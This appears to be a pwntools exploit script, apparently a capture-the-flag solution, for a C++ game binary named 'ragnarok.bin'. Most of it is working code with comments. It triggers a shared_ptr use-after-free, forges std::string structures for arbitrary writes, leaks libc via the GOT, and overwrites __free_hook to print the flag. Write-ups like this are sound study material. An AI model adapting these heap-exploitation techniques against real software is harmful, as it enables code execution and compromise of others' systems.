#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', aslr=True, terminal=['tmux', 'neww'])
env = {'LD_PRELOAD': './libvtv.so.0'}

if args['GDB']:
    io = gdb.debug('./ragnarok.bin', env=env, gdbscript='''\
        set follow-fork-mode parent
        c
    ''')
    elf, libc = io.elf, io.libc
else:
    io = process('./ragnarok.bin', env=env)
    elf, libc = io.elf, io.libc

# thanks to https://gist.github.com/saelo/0c77ce6c2b84af70644d81802892c289

# tl; dr
# obtained arbitrary writes thanks to a use-after-free vulnerability, and used them
# to overwrite __free_hook with puts() and execute the code at line 715 of ragnarok.cc


def earn_money(n):
    char_matchers = {
        'h': re.compile(r'^    \S     \S      '),
        'i': re.compile(r'^     \S\S\S     '),
        't': re.compile(r'^   \S\S\S\S\S\S\S    '),
        'c': re.compile(r'^     \S\S\S\S     \n    \S     '),
        'o': re.compile(r'^    \S\S\S\S     \n    \S    \S '),
        'n': re.compile(r'^   \S    \S    ')
    }

    for _ in range(n):
        io.recvuntil('***************************\n')
        output = io.recvuntil('\n***************************\n', drop=True)
        io.recvuntil('Magic : ')

        for c, p in char_matchers.items():
            if p.match(output):
                io.sendline(c)
                break
        else:
            raise AssertionError
    io.sendline('q')


def fight():
    while True:
        # always attack
        io.recvuntil('Your choice :')
        io.sendline('1')

        while True:
            output = io.recvline()
            if 'You died' in output:
                return False
            elif 'You win' in output:
                io.recvuntil('Name :')
                io.sendline('integeruser')
                return True
            elif '=============' in output:
                break


# to trigger the vulnerability (explained later) and exploit the binary,
# we need to equip Odin with a weapon named "Gungnir"
# to make and equip any weapon we need lots of money, but enough of it can be earned
# by choosing Thor and winning a fight
while True:
    # earn some money to be able to continue if defeated in fight
    io.recvuntil('Your choice :')
    io.sendline('3')
    earn_money(3)

    # choose Thor
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Choose your figure :')
    io.sendline('2')

    # fight
    io.recvuntil('Your choice :')
    io.sendline('5')
    won = fight()
    if won: break

    # defeated, continue?
    io.sendline('1')

success('Fight won')

# now we have enough money to make and equip a weapon, but we need to switch
# character from Thor to Odin
# to do so, fight again until defeated
while True:
    # fight
    io.recvuntil('Your choice :')
    io.sendline('5')
    won = fight()
    if not won:
        # defeated, continue?
        io.sendline('1')
        break

success('Fight lost')

# now we can choose a new character
# choose Odin
io.recvuntil('Your choice :')
io.sendline('1')
io.recvuntil('Choose your figure :')
io.sendline('1')

# equipping a weapon named "Gungnir" to Odin triggers the execution of
# `cast_spell(shared_ptr<Figure>(this))` at line 173, resulting in two different shared pointers
# for the same object (the other pointer is the global `shared_ptr<Figure> character`
# at line 122)
# when `cast_spell()` terminates, the chunk pointed by the local shared pointer will be freed,
# resulting in a use-after-free for the global pointer
io.recvuntil('Your choice :')
io.sendline('4')
io.recvuntil('Name of your weapon :')
io.sendline('Gungnir')

# `std::string`s are represented in memory as:
# {
#   pointer to data buffer,
#   current size,
#   maximum size (capacity)
# }
# in string assignments, if the capacity of the destination string is greater or equal
# to the size of the source string, then the content of the source data buffer
# is simply memcpy'ed to the destination data buffer

# if we change description (see `change_descript()` at line 545) with a string big enough,
# then the `std::string desc` allocated at line 549 will overlap the chunk containing
# the data for the chosen character
# in this way, in the string assignment `desc = str` at line 69, we control both
# the full structure of `desc` (destination) and the content of `str` (source),
# and by manipulating the structure of `desc` we obtain an arbitrary memcpy
io.recvuntil('Your choice :')
io.sendline('6')
io.recvuntil('Description : ')

# we use this arbitrary write to construct a fake Odin figure in BSS and change
# the global `character` pointer to point to it
vtable_odin_address = 0x40c700

where = 0x613648
fake_odin_address = 0x613648 + 0x8 * 12

what = ''.join(
    p64(data)
    for data in [
        0x0,
        fake_odin_address,  # `character` (line 122)
        0x0,
        0x0,
        0x0,
        where,  # pointer to data buffer
        0xffffffffffffffff,  # size
        0xffffffffffffffff,  # capacity (also overlaps with `money` and `highest` (lines 124-125))
        0x0,
        0x0,
        0x0,
        0x0,

        # fake Odin figure
        vtable_odin_address,
        0x0,  # `name`
        0x0,
        0x0,
        0x0,
        fake_odin_address,  # `desc` (**)
        0x100,
        0x100,
        0x0,
        elf.symbols['got.free'],  # `weapon` (*)
        0x8,
        0x8,
        0x0,
        0x41414141,  # `atk`
        0x41414141,  # `hp`
    ])
io.sendline(what)

# now, this fake figure was constructed in such a way that the `std::string` structure
# for `weapon` (see (*)) points to the GOT address of free()

# in this way, we can simply call `show_figure()` at line 530 to leak the address of free()
io.recvuntil('Your choice :')
io.sendline('2')
io.recvuntil('Weapon : ')
free_address = u64(io.recvn(8))
if free_address != libc.symbols['free']:
    libc.address = free_address - libc.symbols['free']
# libc.address = 0x7ffff6f5d000 TODO
success('libc.address: %s' % hex(libc.address))
__free_hook_address = libc.symbols['__free_hook']
success('__free_hook_address: %s' % hex(__free_hook_address))

# in the same way, the `std::string` structure for `desc` (see (**)) was crafted
# in such a way that when `change_descript()` is called and `change_desc()` invoked
# we obtain an arbitrary write at the address of its data buffer
io.recvuntil('Your choice :')
io.sendline('6')
io.recvuntil('Description : ')

# we use this arbitrary write to change the `weapon` of our fake Odin figure to
# point to the address of __free_hook
where = fake_odin_address

what = ''.join(
    p64(data)
    for data in [
        vtable_odin_address,
        0x0,  # `name`
        0x0,
        0x0,
        0x0,
        where,  # `desc`
        0x0,
        0x0,
        0x0,
        __free_hook_address,  # `weapon`
        0x0,  # the string must be empty to pass the check at line 166
        0x8
    ])
io.sendline(what)

# now, we trigger the arbitrary write `weapon = str` at line 167 and set __free_hook to puts()
io.recvuntil('Your choice :')
io.sendline('4')
io.recvuntil('Name of your weapon :')
io.sendline(p64(libc.symbols['puts']))

# win any fight to print the flag on screen
io.recvuntil('Your choice :')
io.sendline('5')
io.sendline('1')
io.recvuntil('Something for you :)')

io.interactive()
